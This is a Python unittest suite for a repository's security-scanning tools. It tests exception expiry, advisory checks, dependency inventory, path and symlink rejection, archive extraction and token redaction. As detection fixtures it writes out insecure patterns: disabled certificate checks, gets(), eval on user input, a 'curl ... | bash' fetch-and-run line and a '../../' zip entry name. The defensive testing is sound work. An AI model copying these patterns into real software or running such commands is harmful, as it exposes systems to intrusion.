from __future__ import annotations

from dataclasses import replace
from datetime import date, datetime, timedelta, timezone
from email.utils import format_datetime
import io
import json
import os
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import patch
import zipfile

from tools import security_advisories, security_install
from tools.security_common import POLICY, ROOT, SecurityError, child_environment, decode_json, read_file, run
from tools.security_content import source_findings, stage_text
from tools.security_findings import apply_exceptions, finding, load_exceptions
from tools.security_inventory import Package, inventory, npm_packages, pypi_packages
from tools.security_scan import revision_state


class SecurityFixtureTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)

    def write(self, path: str, content: str) -> Path:
        target = self.root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
        return target

    def exception(self) -> tuple[object, dict]:
        item = finding("rustsec", "RUSTSEC-2020-0071", "Cargo.lock", "time@0.1.44")
        entry = {key: value for key, value in item.public().items() if key not in {"line", "column"}}
        entry.update({"owner": "@KirilsTurkins", "created": "2026-09-18", "expires": "2026-09-25",
                      "rationale": "Harmless test fixture only; this exact locked crate is not in the runtime graph.",
                      "review": "https://github.com/KirilsTurkins/latent-service-fabric/issues/282"})
        return item, entry

    def test_exact_exception_matches_no_other_version_path_or_finding(self) -> None:
        item, entry = self.exception()
        self.write("exceptions.json", json.dumps({"schema": 1, "exceptions": [entry]}))
        exceptions = load_exceptions(self.root, date(2026, 9, 19))
        others = [finding("rustsec", "RUSTSEC-2020-0071", "Cargo.lock", "time@0.1.43"),
                  replace(item, path="sdk/Cargo.lock"), replace(item, finding="RUSTSEC-2026-0001")]
        remaining, waived = apply_exceptions([item, *others], exceptions)
        self.assertEqual(waived, [item])
        self.assertEqual(set(remaining), set(others))

    def test_expired_unowned_wildcard_and_long_exceptions_fail(self) -> None:
        item, valid = self.exception()
        for field, value in (("expires", "2026-09-19"), ("expires", "2027-01-01"), ("owner", ""),
                             ("finding", "RUSTSEC-*"), ("path", "**/Cargo.lock"), ("package", "time"),
                             ("review", ""), ("rationale", "unreachable")):
            entry = {**valid, field: value}
            self.write("exceptions.json", json.dumps({"schema": 1, "exceptions": [entry]}))
            with self.subTest(field=field, value=value), self.assertRaises((SecurityError, ValueError)):
                load_exceptions(self.root, date(2026, 9, 19))

    def test_source_exception_is_bound_to_exact_content_and_location(self) -> None:
        original = finding("source", "python-eval-exec", "tools/example.py", line=1, content=b"before\n")
        changed = finding("source", "python-eval-exec", "tools/example.py", line=1, content=b"after\n")
        moved = finding("source", "python-eval-exec", "tools/example.py", line=2, content=b"before\n")
        column = finding("source", "python-eval-exec", "tools/example.py", line=1, column=2, content=b"before\n")
        portable = finding("source", "python-eval-exec", "tools/example.py", line=1, content=b"before\r\n")
        self.assertNotEqual(original.fingerprint, changed.fingerprint)
        self.assertNotEqual(original.fingerprint, moved.fingerprint)
        self.assertNotEqual(original.fingerprint, column.fingerprint)
        self.assertEqual(original.fingerprint, portable.fingerprint)

    def test_secret_exception_cannot_hide_changed_content_location_or_rule(self) -> None:
        original = finding("gitleaks", "generic-api-key", "docs/fixture.md", line=1, column=4,
                           content=b"public integrity identity\n")
        _, entry = self.exception()
        entry.update({key: value for key, value in original.public().items() if key not in {"line", "column"}})
        entry["rationale"] = "Harmless public integrity fixture; never permits other contents or locations."
        self.write("exceptions.json", json.dumps({"schema": 1, "exceptions": [entry]}))
        exceptions = load_exceptions(self.root, date(2026, 9, 19))
        changed = finding("gitleaks", "generic-api-key", "docs/fixture.md", line=1, column=4,
                          content=b"different unreviewed material\n")
        others = [changed, replace(original, path="docs/other.md"),
                  replace(original, finding="different-rule"),
                  finding("gitleaks", "generic-api-key", "docs/fixture.md", line=1, column=5,
                          content=b"public integrity identity\n")]
        remaining, waived = apply_exceptions([original, *others], exceptions)
        self.assertEqual(waived, [original])
        self.assertEqual(set(remaining), set(others))
        with self.assertRaisesRegex(SecurityError, "expired-or-future-exception"):
            load_exceptions(self.root, date(2026, 9, 25))

    def test_stale_database_head_age_and_future_timestamp_fail(self) -> None:
        current = int(datetime.now(timezone.utc).timestamp())
        security_advisories.validate_database_identity("a" * 40, "a" * 40, current, current)
        for remote, stamp in (("b" * 40, current), ("a" * 40, current - 15 * 86400),
                              ("a" * 40, current + 301)):
            with self.assertRaises(SecurityError):
                security_advisories.validate_database_identity("a" * 40, remote, stamp, current)

    def test_unavailable_database_is_not_an_empty_advisory_result(self) -> None:
        with patch("tools.security_advisories.run", side_effect=SecurityError("scanner-or-network-failed")):
            with self.assertRaisesRegex(SecurityError, "scanner-or-network-failed"):
                security_advisories.fetch_rustsec(self.root)

    def test_osv_pass_and_fail_use_explicit_per_package_results(self) -> None:
        packages = [Package("npm", "fixture", "1.0.0", "sdk/package-lock.json")]
        now = format_datetime(datetime.now(timezone.utc), usegmt=True)
        for vulnerable in (False, True):
            result = {"vulns": [{"id": "GHSA-fixture-test-only", "modified": "2026-09-19T00:00:00Z"}]} if vulnerable else {}
            response = json.dumps({"results": [result]}).encode()
            findings, receipts = security_advisories.query_osv(packages, lambda payload: (response, now))
            self.assertEqual(len(findings), int(vulnerable))
            self.assertEqual(receipts[0]["packages"], 1)
            self.assertEqual(len(receipts[0]["response_sha256"]), 64)

    def test_osv_empty_truncated_stale_duplicate_and_unavailable_fail(self) -> None:
        packages = [Package("npm", "fixture", "1.0.0", "sdk/package-lock.json")]
        now = datetime.now(timezone.utc)
        fixtures = [(b"{}", now), (b'{"results":[]}', now), (b'{"results":[{}]}', now - timedelta(hours=2)),
                    (b'{"results":[{},{}]}', now), (b'{"results":[{"next_page_token":"next"}]}', now),
                    (b'{"results":[],"results":[{}]}', now)]
        for response, observed in fixtures:
            with self.subTest(response=response), self.assertRaises(SecurityError):
                security_advisories.query_osv(packages, lambda payload: (response, format_datetime(observed, usegmt=True)))
        with self.assertRaises(OSError):
            security_advisories.query_osv(packages, lambda payload: (_ for _ in ()).throw(OSError("offline")))

    def test_current_manifest_inventory_covers_guest_client_and_build_locks(self) -> None:
        packages, records = inventory(ROOT)
        paths = {entry["path"] for entry in records}
        self.assertIn("Cargo.toml", paths)
        self.assertIn("sdk/go/go.mod", paths)
        self.assertIn("sdk/java-client/build.gradle.kts", paths)
        self.assertIn("sdk/dotnet/Latent.Sdk/Latent.Sdk.csproj", paths)
        self.assertTrue(any(package.path == "sdk/typescript-client/package-lock.json" for package in packages))
        self.assertTrue(any(package.path == "examples/renderer-profile/package-lock.json" for package in packages))
        self.assertTrue(any(package.path == "tools/requirements.lock" for package in packages))

    def test_new_manifest_missing_lock_or_unresolved_requirement_cannot_pass(self) -> None:
        self.write("package.json", '{"dependencies":{"fixture":"1.0.0"}}')
        with self.assertRaises(OSError):
            npm_packages(self.root, {"path": "package.json", "lock": "package-lock.json"})
        self.write("package-lock.json", '{"lockfileVersion":3,"packages":{"":{"dependencies":{"fixture":"1.0.0"}}}}')
        with self.assertRaisesRegex(SecurityError, "npm-direct-dependency-missing"):
            npm_packages(self.root, {"path": "package.json", "lock": "package-lock.json"})
        self.write("requirements.txt", "fixture>=1.0\n")
        with self.assertRaisesRegex(SecurityError, "unresolved-python-requirement"):
            pypi_packages(self.root, "requirements.txt")
        from tools.security_common import tracked_paths
        with patch("tools.security_inventory.tracked_paths", return_value=[*tracked_paths(ROOT), "sdk/new/pom.xml"]):
            with self.assertRaisesRegex(SecurityError, "unreviewed-or-missing-dependency-manifest"):
                inventory(ROOT)

    def test_legacy_release_absent_features_do_not_hide_partial_or_unknown_manifests(self) -> None:
        from tools.security_common import tracked_paths
        optional = ("examples/renderer-profile/", ".github/security/")
        legacy_paths = [path for path in tracked_paths(ROOT) if not path.startswith(optional)]
        with patch("tools.security_inventory.tracked_paths", return_value=legacy_paths):
            packages, records = inventory(ROOT)
        absent = {entry["path"] for entry in records if entry["coverage"] == "not-shipped-at-source-revision"}
        self.assertEqual(absent, {"examples/renderer-profile/package.json", ".github/security/requirements.txt", "website/package.json"})
        self.assertTrue(any(package.path == "controls/.github/security/requirements.txt" for package in packages))
        self.assertFalse(any(package.path.startswith("examples/renderer-profile/") for package in packages))
        for partial in ("examples/renderer-profile/README.md", ".github/security/unexpected.json"):
            with self.subTest(partial=partial), patch("tools.security_inventory.tracked_paths", return_value=[*legacy_paths, partial]):
                with self.assertRaisesRegex(SecurityError, "unreviewed-or-missing-dependency-manifest"):
                    inventory(ROOT)
        with patch("tools.security_inventory.tracked_paths", return_value=[*legacy_paths, "website/README.md"]):
            with self.assertRaises(OSError):
                inventory(ROOT)

    def test_node_sdk_inventory_includes_pinned_runtime_and_development_dependencies(self) -> None:
        manifest = {"dependencies": {"@bufbuild/protobuf": "2.15.0"},
                    "devDependencies": {"@types/node": "24.13.6"}, "engines": {"node": "24.19.x"}}
        resolved = {"": manifest}
        for name, version in {**manifest["dependencies"], **manifest["devDependencies"]}.items():
            resolved[f"node_modules/{name}"] = {"version": version,
                "resolved": f"https://registry.npmjs.org/{name}/-/{name.rsplit('/', 1)[-1]}-{version}.tgz"}
        self.write("package.json", json.dumps(manifest))
        self.write("package-lock.json", json.dumps({"lockfileVersion": 3, "packages": resolved}))
        packages = npm_packages(self.root, {"path": "package.json", "lock": "package-lock.json"})
        self.assertEqual({(package.name, package.version) for package in packages},
                         {("@bufbuild/protobuf", "2.15.0"), ("@types/node", "24.13.6")})

    def test_renderer_toolchain_removes_the_unpatched_archive_extractor(self) -> None:
        path = "examples/renderer-profile/package.json"
        manifest = decode_json(read_file(ROOT, path))
        self.assertEqual(manifest["overrides"]["@bytecodealliance/weval"], "0.5.0")
        packages = npm_packages(ROOT, {"path": path, "lock": "examples/renderer-profile/package-lock.json"})
        self.assertEqual({package.version for package in packages if package.name == "@bytecodealliance/weval"}, {"0.5.0"})
        self.assertFalse(any(package.name == "decompress" or package.name.startswith("decompress-") for package in packages))

    def test_synthetic_source_rule_has_pass_and_fail_without_execution(self) -> None:
        path = "tools/fixture.py"
        self.write(path, "value = 1\n")
        self.assertEqual(source_findings(self.root, [path]), [])
        self.write(path, "value = ev" + "al(user_input)\n")
        findings = source_findings(self.root, [path])
        self.assertEqual([entry.finding for entry in findings], ["python-eval-exec"])
        self.assertNotIn("user_input", json.dumps(findings[0].public()))

    def test_stage_only_selected_documentation_and_reject_path_escape(self) -> None:
        self.write("docs/README.md", "Harmless documentation.\n")
        paths, binaries = stage_text(self.root, self.root / "staged", ["docs/README.md"])
        self.assertEqual(paths, ["docs/README.md"])
        self.assertEqual(binaries, 0)
        with self.assertRaises(SecurityError):
            read_file(self.root, "../outside")

    def test_binary_marker_cannot_hide_a_documentation_secret(self) -> None:
        self.write("docs/README.md", "harmless\x00marker")
        with self.assertRaisesRegex(SecurityError, "binary-content-in-text-surface"):
            stage_text(self.root, self.root / "staged", ["docs/README.md"])

    def test_each_reviewed_source_rule_has_a_harmless_detection_fixture(self) -> None:
        cases = {
            "apps/fixture.rs": "client.danger_accept_invalid_certs(true)",
            "tools/fixture.py": "ssl._create_" + "unverified_context()",
            "sdk/fixture.ts": "rejectUnauthorized: false",
            "sdk/fixture.go": "InsecureSkipVerify: true",
            "sdk/fixture.cs": "DangerousAcceptAnyServerCertificateValidator",
            "sdk/fixture.java": "NoopHostnameVerifier",
            "sdk/fixture.c": "gets(buffer)",
            "tools/fixture.sh": "curl https://example.invalid/fixture | bash",
        }
        for path, payload in cases.items():
            self.write(path, payload)
            with self.subTest(path=path):
                self.assertEqual(len(source_findings(self.root, [path])), 1)

    def test_linked_input_rejected_where_symlinks_are_supported(self) -> None:
        self.write("original.txt", "harmless")
        try:
            (self.root / "linked.txt").symlink_to(self.root / "original.txt")
        except (OSError, NotImplementedError):
            self.skipTest("host does not allow creating symlinks")
        with self.assertRaises(SecurityError):
            read_file(self.root, "linked.txt")

    def test_deep_tracked_inputs_are_read_without_relaxing_path_validation(self) -> None:
        relative = "/".join(["nested-" + "fixture" * 7] * 5 + ["fixture.txt"])
        filesystem_root = Path("\\\\?\\" + str(self.root)) if os.name == "nt" else self.root
        target = filesystem_root / relative
        try:
            target.parent.mkdir(parents=True)
            target.write_bytes(b"harmless")
            self.assertEqual(read_file(self.root, relative), b"harmless")
        finally:
            target.unlink(missing_ok=True)
            parent = target.parent
            while parent != filesystem_root:
                parent.rmdir()
                parent = parent.parent

    def test_tools_require_both_reviewed_archive_and_binary_digests(self) -> None:
        lock = security_install.tool_lock()
        self.assertEqual(len(lock["tools"]), 3)
        for tool in lock["tools"].values():
            self.assertEqual(len(tool["commit"]), 40)
            for asset in tool["assets"].values():
                self.assertEqual(len(asset["sha256"]), 64)
                self.assertEqual(len(asset["binary_sha256"]), 64)
        with patch("tools.security_install.download", return_value=b"not an upstream asset"):
            with self.assertRaisesRegex(SecurityError, "download-digest-mismatch"):
                security_install.install("gitleaks", self.root)
        self.assertEqual(list(self.root.iterdir()), [])

    def test_archive_extraction_never_uses_supplied_filesystem_paths(self) -> None:
        payload = io.BytesIO()
        with zipfile.ZipFile(payload, "w") as archive:
            archive.writestr("../../gitleaks", b"harmless non-executable fixture")
        self.assertEqual(security_install.extract_binary(payload.getvalue(), "fixture.zip", "gitleaks"),
                         b"harmless non-executable fixture")
        self.assertEqual(list(self.root.iterdir()), [])

    def test_child_environment_and_output_bound_redact_failures(self) -> None:
        with patch.dict("os.environ", {"GH_TOKEN": "synthetic", "GITHUB_TOKEN": "synthetic", "GITLEAKS_CONFIG": "untrusted"}):
            environment = child_environment(self.root)
        self.assertNotIn("GH_TOKEN", environment)
        self.assertNotIn("GITHUB_TOKEN", environment)
        self.assertNotIn("GITLEAKS_CONFIG", environment)
        with self.assertRaisesRegex(SecurityError, "process-output-limit"):
            run([sys.executable, "-c", "print('harmless' * 100)"], self.root, limit=16)
        with self.assertRaisesRegex(SecurityError, "process-timeout"):
            run([sys.executable, "-c", "import time; time.sleep(10)"], self.root, timeout=1)

    def test_duplicate_json_and_committed_expired_fixture_fail(self) -> None:
        with self.assertRaises(SecurityError):
            decode_json(b'{"schema":1,"schema":2}')
        fixture = ROOT / "tools/security_fixtures/expired-exception.json"
        self.write("exceptions.json", fixture.read_text())
        with self.assertRaisesRegex(SecurityError, "expired-or-future-exception"):
            load_exceptions(self.root, date(2026, 9, 19))

    def test_local_modified_evidence_is_not_reported_as_an_exact_clean_revision(self) -> None:
        for changes, clean in ((b"", True), (b" M Cargo.lock\n", False), (b"?? fixture.txt\n", False)):
            with patch("tools.security_scan.run", side_effect=[(0, b"a" * 40 + b"\n"), (0, changes)]):
                self.assertEqual(revision_state(self.root, self.root), ("a" * 40, clean))


if __name__ == "__main__":
    unittest.main()
